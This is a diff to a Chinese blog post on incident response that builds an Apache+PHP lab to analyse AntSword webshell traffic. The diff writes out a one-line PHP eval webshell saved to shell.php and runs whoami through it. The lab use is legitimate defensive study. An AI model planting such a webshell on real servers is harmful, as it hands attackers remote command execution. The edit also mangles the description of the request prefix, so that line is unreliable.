@@ -9,8 +9,8 @@ tags:
   - "应急响应"
 authors:
   - "bx33661"
-draft: false              # 设为 true 则为草稿
-slug: "k8x9w22"          # 随机URL字符串
+draft: false
+slug: "k8x9w22"
 ---
 
 <meta name="referrer" content="no-referrer">
@@ -30,7 +30,7 @@ slug: "k8x9w22"          # 随机URL字符串
 
 主要是配个 apache+php 环境
 
-```plain
+```bash
 sudo apt update
 sudo apt install apache2 -y
 sudo apt install php libapache2-mod-php -y
@@ -39,13 +39,13 @@ sudo systemctl restart apache2
 
 创建一个 PHP 漏洞
 
-```plain
+```bash
 echo "<?php @eval(\$_POST['ant']); ?>" | sudo tee /var/www/html/shell.php
 ```
 
 可以命令行查看 ip
 
-```plain
+```bash
 ip addr
 ```
 
@@ -71,8 +71,8 @@ ip addr
 
 ### 总结
 
-1. <font style="color:rgb(33, 37, 41);">每个请求都以</font>`<font style="color:rgb(33, 37, 41);">@ini_set("display_errors",“0”);@set_time_limit(0);,</font>`<font style="color:rgb(33, 37, 41);">开头</font>
-2. <font style="color:rgb(33, 37, 41);">对于响应包来说，我们采用默认的话，就是额外字符加返回结果，查询结果是</font>`<font style="color:rgb(192, 52, 29);background-color:rgb(251, 229, 225);">随机数 结果 随机数</font>`
+1. 每个请求都以“0”开头
+2. 对于响应包来说，我们采用默认的话，就是额外字符加返回结果，查询结果是随机数 结果 随机数
 
 ![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1744733826623-0c816d10-6dd7-4578-87a6-374003b7788c.png)
 
@@ -89,13 +89,13 @@ ip addr
 
 #### 执行命令
 
-> <font style="color:rgb(25, 27, 31);">蚁剑与网站进行数据交互的过程中，发送的数据是经过编码器编码后再发送，支持的编码方式有default默认的、base64、chr、chr16、rot13；网站返回的数据经过解码器中的编码方式编码后返回，支持的编码方式有default、base64、rot13</font>
+> 蚁剑与网站进行数据交互的过程中，发送的数据是经过编码器编码后再发送，支持的编码方式有default默认的、base64、chr、chr16、rot13；网站返回的数据经过解码器中的编码方式编码后返回，支持的编码方式有default、base64、rot13
 
 解码和编码器都是 default
 
 ![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1744733250271-1ea78baf-75b0-4bd0-8e39-efc744098d63.png)
 
-```plain
+```bash
 whoami
 ```
 
